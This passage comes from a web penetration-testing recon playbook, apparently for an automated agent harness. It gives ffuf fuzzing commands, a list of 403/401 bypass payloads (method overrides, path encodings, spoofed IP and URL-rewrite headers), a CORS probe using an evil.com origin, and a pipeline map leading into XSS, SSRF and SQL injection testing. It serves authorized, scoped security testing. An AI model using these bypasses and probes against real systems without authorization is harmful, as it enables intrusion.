ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404 -t 50 -o /home/kali/Targets/targets/TARGET_NAME/recon/target_ffuf_raw.json 2>/dev/null

# Analyze — if 403/length:44 appears 50+ times, it's a wall (generic 403 block page)
# Filter it: add -fl 44 to exclude all 44-length responses
# Common filters: -fs SIZE (filter by size), -fl LINES (filter by line count)
# -fw WORDS (filter by word count), -fc CODE (filter by status code)

# Second pass — filter out the wall
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -fc 404,403 -fl 44 -t 50 -c 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_ffuf.txt

# API endpoint fuzzing (same technique — adjust filters per run)
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api_small.txt \
  -fc 404,403,500 -t 50 -c 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_api_ffuf.txt
```
- First run without filters to discover the response "wall" pattern
- Look for a status+size combo that appears 50+ times — that's your wall
- **Any status code can be a wall** — 2XX, 3XX, 4XX, 5XX. Check the most frequent combo and filter it
- Filter syntax: `-fc CODE -fl LINES -fs SIZE -fw WORDS`
- Stack multiple filters: `-fc 403,404 -fl 44,64,150`
- **Scope note:** Only fuzz paths under the in-scope domain

### R18: 403/401 Bypass — gobypass403 + manual techniques
After feroxbuster discovers endpoints returning 403/401, bypass each one:

```bash
# Extract 403/401 endpoints from feroxbuster output
grep "403\|401" /home/kali/Targets/targets/TARGET_NAME/recon/target_ferox.txt | awk '{print $2}' | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_403_endpoints.txt

# Bulk bypass — test each discovered 403/401 path
gobypass403 -l /home/kali/Targets/targets/TARGET_NAME/recon/target_403_endpoints.txt -t 30 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_bypass.txt
```

If gobypass403 fails, try these manual techniques:

**Method override:**
```
GET /admin → POST, PUT, PATCH, OPTIONS, HEAD, TRACE, CONNECT, INVENTED, HACK
Also try: X-HTTP-Method-Override: PUT header
```

**Path manipulation:**
```
/admin → /admin/, //admin/, /./admin/, /admin/../admin/, /ADMIN/
/admin → /%2fadmin, /%252fadmin, /admin%00, /admin?%23bypass
/admin → /admin;.css, /admin;.html (append extension tricks)
```

**Header injection (test each individually):**
```
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: https://target.com/admin
Host: localhost (or arbitrary value)
```

**Protocol version:**
```
HTTP/2 → HTTP/1.1, HTTP/1.0
```

**User-Agent swap:**
```
Change User-Agent to: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```
- gobypass403 automates 40+ techniques. Manual only if it fails.
- Track which bypass works: note the exact header/path/method for the report.

### R19: CORS Misconfiguration Check
```bash
curl -s -H "Origin: https://evil.com" -I https://target.com | grep -i "access-control-allow-origin"
```
- If `Access-Control-Allow-Origin: https://evil.com` → CORS misconfig
- If `Access-Control-Allow-Origin: *` with credentials → exploitable

### R20: SSL/Certificate Analysis (crt.sh)
```bash
# Even on URL_ONLY, crt.sh can reveal related hosts
curl -s "https://crt.sh/?q=%25.target.com&output=json" 2>/dev/null | python3 -c "
import json,sys
d=json.load(sys.stdin)
seen=set()
for e in d:
    for n in e.get('name_value','').split('\\\\n'):
        n=n.strip().lower()
        if n not in seen and n != 'target.com':
            seen.add(n)
for s in sorted(seen)[:20]:
    print(s)
" 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_crtsh.txt
```
- Discovers subdomains, staging/dev instances, internal hosts
- Scope discipline: flaged as "outside scope" — reference only for attack surface awareness

---

## Scope Discipline
- ALL tools must be restricted to in-scope domains only
- If scope is URL_ONLY (e.g., https://target.com): NO subdomain discovery
- If scope is WILDCARD (e.g., *.target.com): full recon across all subdomains
- Cross-target findings kept separate — never mix

## Output Format
All recon output saved to `~/Targets/{{TARGET_NAME}}/recon/` for the session.
HH-generated scripts saved to `~/Targets/{{TARGET_NAME}}/scripts/`.
Everything condensed into `~/Targets/{{TARGET_NAME}}/plan.md` for Hacker-Harness subagents.

---

## Data Flow Summary

```
R1  → target_sensitive_files.txt          [findings only]
R2  → target_katana.txt ──────────────────┐
R3  → target_gau.txt ─────────────────────┤
    → target_wayback.txt ─────────────────┤→ R7 merge → gwjs_endpoints.txt → Arjun
R4  → GW_emails.txt — emails with 5+ occurrences (finding)
    → GW_live_tokens.txt — verified live tokens (finding)
    → GW_files.txt — accessible CSV/Excel/PDF (finding)
    → GW_dotfile.txt — accessible .env/.git/etc (finding)
    → target_secrets.txt — token/api_key/secret patterns
R5  → target_endpoints.txt ───────────────┘         → GWJSAJQ_urls.txt → R11 XSStrike
    → target_js_secrets.txt               [findings only]                  → R11 CSP bypass re-test
    → target_postmessage.txt              [findings only]                  → R12 SSRF
    → jsbundles/*.js ───────────────────────── R11 CSPP gadget chains
R6  → target_recovered_sources.txt        [findings only]
R7  → target_params.txt ─────────────────── R11 XSStrike backup, R12 SSRF
    → ptLFI.txt ───────────────────────────── E2 LFI/Path Traversal, R12 SSRF (overlap)
R8  → target_whatweb.txt ─────────────────── E2 (OS detection)
R9  → target_csp_domains.txt ─────────────── CSP Bypass lookup
    → target_csp_bypass_payloads.txt ──────── R11 XSS (re-test with bypass payloads)
R11 → psqli.txt ──────────────────────────── E1 BSQLi + sqlmap
R11 → (test output only)
R12 → target_ssrf_params.txt → ssrfmap
    → target_oob.txt                       interactsh

E1  ← psqli.txt (R11)
E2  ← ptLFI.txt (R7) + target_whatweb.txt (R8)

R14-R19 standalone (no dependencies)
R17 ← target_ferox.txt (R16, only if run)
```